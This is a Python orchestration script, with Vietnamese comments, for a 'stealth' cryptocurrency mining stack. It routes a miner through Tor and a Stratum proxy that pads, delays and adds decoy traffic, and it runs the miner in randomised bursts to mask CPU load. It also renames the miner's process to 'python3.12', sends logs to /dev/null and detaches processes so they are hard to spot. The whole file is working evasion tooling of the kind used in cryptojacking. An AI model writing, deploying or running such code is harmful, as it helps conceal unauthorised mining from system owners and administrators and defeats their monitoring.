#!/usr/bin/env python3
"""
stealth_full.py — Full stack: Tor → Stratum proxy → Load scheduler → Miner.
1 lệnh chạy hết, không cần root.

Flow:
    Miner (fake proc name)
      ↓ 127.0.0.1:3333
    Stratum proxy (padding + delay + decoy)
      ↓ SOCKS5 127.0.0.1:9050
    Tor
      ↓
    Real pool (stratum+ssl://...)

Usage:
    python3 stealth_full.py \
        --pool stratum+ssl://pool.example.com:4444 \
        --wallet WALLET \
        --algo pearlhash \
        --worker rig01
    
    # Dry-run trước
    python3 stealth_full.py --pool ... --wallet ... --dry-run
    
    # Bỏ qua Tor (direct)
    python3 stealth_full.py --pool ... --wallet ... --no-tor
    
    # Custom patterns
    python3 stealth_full.py --pool ... --wallet ... \
        --mine-min 45 --mine-max 90 --pause-min 3 --pause-max 10
"""
import os
import sys
import time
import signal
import argparse
import subprocess
from pathlib import Path
from typing import Optional

# ── Import modules cùng directory ────────────────────────────────────────────
SCRIPT_DIR = Path(__file__).parent
sys.path.insert(0, str(SCRIPT_DIR))

# Lazy import — chỉ cần khi chạy thật
def import_tor_bootstrap():
    """Import từ stealth.py."""
    try:
        import stealth
        return stealth
    except ImportError:
        return None

def import_stratum_proxy():
    try:
        import stratum_proxy
        return stratum_proxy
    except ImportError:
        return None

def import_load_scheduler():
    try:
        import load_scheduler
        return load_scheduler
    except ImportError:
        return None


# ── Logging ──────────────────────────────────────────────────────────────────
VERBOSE = False

def log(msg):
    sys.stderr.write("[full] {}\n".format(msg))
    sys.stderr.flush()

def log_err(msg):
    sys.stderr.write("[full:err] {}\n".format(msg))
    sys.stderr.flush()


# ── Config ───────────────────────────────────────────────────────────────────
DEFAULT_LISTEN = "127.0.0.1:3333"
DEFAULT_SOCKS = "127.0.0.1:9050"
DISGUISE_PROC = "python3.12"


# ── Tor manager ──────────────────────────────────────────────────────────────
class TorManager:
    """Bootstrap Tor, chờ ready, cleanup."""
    
    def __init__(self, socks_addr: str = DEFAULT_SOCKS):
        self.socks_addr = socks_addr
        self.tor_proc: Optional[subprocess.Popen] = None
        self.stealth = import_tor_bootstrap()
    
    def start(self) -> bool:
        """Start Tor. Trả về True nếu SOCKS ready."""
        if not self.stealth:
            log_err("stealth.py không import được — không start Tor")
            return False
        
        # Check đã chạy chưa
        if self.stealth.tor_already_running():
            log("Tor SOCKS đã mở: {}".format(self.socks_addr))
            return True
        
        # Bootstrap
        try:
            binary = self.stealth.ensure_tor()
            self.tor_proc = self.stealth.start_tor(binary)
            log("Tor PID={}".format(self.tor_proc.pid))
            
            if self.stealth.wait_socks_ready(timeout=60):
                if self.stealth.test_socks5():
                    log("Tor SOCKS5 ready")
                    return True
                else:
                    log_err("SOCKS5 handshake fail")
            else:
                log_err("Tor timeout")
        
        except Exception as e:
            log_err("Tor start fail: {}".format(e))
        
        return False
    
    def stop(self):
        if self.tor_proc and self.tor_proc.poll() is None:
            log("stopping Tor...")
            self.tor_proc.terminate()
            try:
                self.tor_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.tor_proc.kill()


# ── Stratum proxy manager ────────────────────────────────────────────────────
class ProxyManager:
    """Chạy Stratum proxy."""
    
    def __init__(self, listen_addr: str, pool_url: str,
                 socks_addr: Optional[str], use_tor: bool):
        self.listen_addr = listen_addr
        self.pool_url = pool_url
        self.socks_addr = socks_addr if use_tor else None
        self.proxy_proc: Optional[subprocess.Popen] = None
        self.proxy_mod = import_stratum_proxy()
    
    def start(self) -> bool:
        """Start Stratum proxy subprocess."""
        if not self.proxy_mod:
            log_err("stratum_proxy.py không import được")
            return False
        
        # Build command
        cmd = [
            sys.executable, str(SCRIPT_DIR / "stratum_proxy.py"),
            "--listen", self.listen_addr,
            "--pool", self.pool_url,
        ]
        if self.socks_addr:
            cmd.extend(["--socks", self.socks_addr])
        
        log("starting Stratum proxy: {}".format(" ".join(cmd)))
        
        self.proxy_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        
        # Đợi proxy listen
        time.sleep(2)
        if self.proxy_proc.poll() is None:
            log("Stratum proxy PID={}".format(self.proxy_proc.pid))
            return True
        else:
            log_err("Stratum proxy exited: code={}".format(self.proxy_proc.returncode))
            return False
    
    def stop(self):
        if self.proxy_proc and self.proxy_proc.poll() is None:
            log("stopping Stratum proxy...")
            self.proxy_proc.terminate()
            try:
                self.proxy_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.proxy_proc.kill()
    
    def get_local_url(self) -> str:
        """URL local để miner kết nối vào."""
        return "stratum+tcp://{}".format(self.listen_addr)


# ── Miner launcher (disguise) ────────────────────────────────────────────────
def launch_miner_disguised(algo: str, wallet: str, worker: str,
                           local_pool_url: str, dry_run: bool) -> Optional[subprocess.Popen]:
    """Launch miner với process name disguise."""
    
    miner_bin = str(SCRIPT_DIR / "onezerominer")
    if not Path(miner_bin).exists():
        # Try PATH
        import shutil
        found = shutil.which("onezerominer")
        if found:
            miner_bin = found
        else:
            log_err("không thấy onezerominer binary")
            return None
    
    # Build args
    miner_args = [
        "--algo={}".format(algo),
        "--pool={}".format(local_pool_url),
        "--wallet={}".format(wallet),
        "--worker={}".format(worker),
        "--log-file=/dev/null",
    ]
    
    # Set comm name
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.prctl(15, DISGUISE_PROC.encode()[:15], 0, 0, 0)
        log("comm name → {}".format(DISGUISE_PROC))
    except Exception:
        pass
    
    if dry_run:
        log("[dry-run] miner: {} {}".format(miner_bin, " ".join(miner_args)))
        return None
    
    log("starting miner: {} ...".format(miner_bin))
    proc = subprocess.Popen(
        [miner_bin] + miner_args,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
    log("miner PID={}".format(proc.pid))
    return proc


# ── Load scheduler wrapper ───────────────────────────────────────────────────
class SchedulerRunner:
    """Chạy load scheduler với miner command."""
    
    def __init__(self, miner_cmd: list, strategy: str = "random-gaps",
                 mine_min: float = 30, mine_max: float = 120,
                 pause_min: float = 2, pause_max: float = 15,
                 dry_run: bool = False):
        self.miner_cmd = miner_cmd
        self.strategy = strategy
        self.mine_min = mine_min
        self.mine_max = mine_max
        self.pause_min = pause_min
        self.pause_max = pause_max
        self.dry_run = dry_run
        self.sched_proc: Optional[subprocess.Popen] = None
    
    def start(self) -> bool:
        sched_mod = import_load_scheduler()
        if not sched_mod:
            log_err("load_scheduler.py không import được — skip scheduler")
            return False
        
        cmd = [
            sys.executable, str(SCRIPT_DIR / "load_scheduler.py"),
            "--strategy", self.strategy,
            "--mine-min", str(self.mine_min),
            "--mine-max", str(self.mine_max),
            "--pause-min", str(self.pause_min),
            "--pause-max", str(self.pause_max),
            "--",
        ] + self.miner_cmd
        
        if self.dry_run:
            cmd.append("--dry-run")
        
        log("starting load scheduler...")
        self.sched_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        log("scheduler PID={}".format(self.sched_proc.pid))
        return True
    
    def stop(self):
        if self.sched_proc and self.sched_proc.poll() is None:
            log("stopping scheduler...")
            self.sched_proc.terminate()
            try:
                self.sched_proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self.sched_proc.kill()


# ── Main orchestrator ────────────────────────────────────────────────────────
def main():
    global VERBOSE
    
    ap = argparse.ArgumentParser(description="Full stealth mining stack")
    
    # Miner config
    ap.add_argument("--algo", required=True, help="Mining algorithm")
    ap.add_argument("--wallet", required=True, help="Wallet address")
    ap.add_argument("--worker", default="rig01", help="Worker name")
    ap.add_argument("--pool", required=True,
                    help="Real pool URL: stratum+ssl://host:port")
    
    # Network
    ap.add_argument("--no-tor", action="store_true", help="Skip Tor")
    ap.add_argument("--socks", default=DEFAULT_SOCKS, help="SOCKS5 addr")
    ap.add_argument("--listen", default=DEFAULT_LISTEN,
                    help="Stratum proxy listen addr")
    
    # Obfuscation
    ap.add_argument("--no-padding", dest="padding", action="store_false", default=True)
    ap.add_argument("--no-delay", dest="delay", action="store_false", default=True)
    ap.add_argument("--no-decoy", dest="decoy", action="store_false", default=True)
    
    # Load pattern
    ap.add_argument("--no-scheduler", action="store_true", help="Skip load scheduler")
    ap.add_argument("--strategy", default="random-gaps",
                    choices=["random-gaps", "power-cycle", "sine"])
    ap.add_argument("--mine-min", type=float, default=30)
    ap.add_argument("--mine-max", type=float, default=120)
    ap.add_argument("--pause-min", type=float, default=2)
    ap.add_argument("--pause-max", type=float, default=15)
    
    # Mode
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("-v", "--verbose", action="store_true")
    
    args = ap.parse_args()
    VERBOSE = args.verbose
    
    log("=" * 50)
    log("Stealth Full Stack")
    log("=" * 50)
    
    # Components
    tor_mgr = None
    proxy_mgr = None
    sched_runner = None
    miner_proc = None
    
    try:
        # 1. Tor
        if args.no_tor:
            log("Tor: SKIPPED (--no-tor)")
            use_tor = False
        else:
            log("Step 1/4: Tor bootstrap...")
            tor_mgr = TorManager(socks_addr=args.socks)
            use_tor = tor_mgr.start()
            if not use_tor:
                log_err("Tor fail — fallback direct (không qua Tor)")
        
        # 2. Stratum proxy
        log("Step 2/4: Stratum proxy...")
        proxy_mgr = ProxyManager(
            listen_addr=args.listen,
            pool_url=args.pool,
            socks_addr=args.socks,
            use_tor=use_tor,
        )
        if not proxy_mgr.start():
            log_err("Proxy fail — miner sẽ kết nối trực tiếp pool")
            local_pool_url = args.pool
            proxy_mgr = None
        else:
            local_pool_url = proxy_mgr.get_local_url()
            log("miner sẽ kết nối: {}".format(local_pool_url))
        
        # 3+4. Load scheduler + Miner
        miner_cmd = [
            str(SCRIPT_DIR / "onezerominer"),
            "--algo={}".format(args.algo),
            "--pool={}".format(local_pool_url),
            "--wallet={}".format(args.wallet),
            "--worker={}".format(args.worker),
            "--log-file=/dev/null",
        ]
        
        if args.no_scheduler:
            log("Step 3/4: Load scheduler: SKIPPED")
            log("Step 4/4: Miner...")
            miner_proc = launch_miner_disguised(
                algo=args.algo,
                wallet=args.wallet,
                worker=args.worker,
                local_pool_url=local_pool_url,
                dry_run=args.dry_run,
            )
        else:
            log("Step 3/4: Load scheduler...")
            sched_runner = SchedulerRunner(
                miner_cmd=miner_cmd,
                strategy=args.strategy,
                mine_min=args.mine_min,
                mine_max=args.mine_max,
                pause_min=args.pause_min,
                pause_max=args.pause_max,
                dry_run=args.dry_run,
            )
            log("Step 4/4: Miner (qua scheduler)...")
            sched_runner.start()
        
        # Summary
        log("")
        log("=" * 50)
        log("Stack ready!")
        log("  Tor: {}".format("ON" if use_tor else "OFF"))
        log("  Proxy: {}".format("ON ({})".format(args.listen) if proxy_mgr else "OFF"))
        log("  Scheduler: {}".format("ON" if sched_runner else "OFF"))
        log("  Disguise: comm='{}'".format(DISGUISE_PROC))
        log("  Pool: {} → {}".format(args.pool, local_pool_url))
        log("  Ctrl+C to stop")
        log("=" * 50)
        
        # Wait
        if args.dry_run:
            log("[dry-run] done — exiting")
            return
        
        # Main loop — wait Ctrl+C
        while True:
            time.sleep(5)
            
            # Check components alive
            if tor_mgr and tor_mgr.tor_proc and tor_mgr.tor_proc.poll() is not None:
                log_err("Tor died!")
            if proxy_mgr and proxy_mgr.proxy_proc and proxy_mgr.proxy_proc.poll() is not None:
                log_err("Proxy died!")
            if sched_runner and sched_runner.sched_proc and sched_runner.sched_proc.poll() is not None:
                log_err("Scheduler died!")
            if miner_proc and miner_proc.poll() is not None:
                log_err("Miner died!")
    
    except KeyboardInterrupt:
        log("")
        log("shutting down...")
    
    finally:
        # Cleanup ngược
        if miner_proc and miner_proc.poll() is None:
            miner_proc.terminate()
        if sched_runner:
            sched_runner.stop()
        if proxy_mgr:
            proxy_mgr.stop()
        if tor_mgr:
            tor_mgr.stop()
        log("done")


if __name__ == "__main__":
    main()
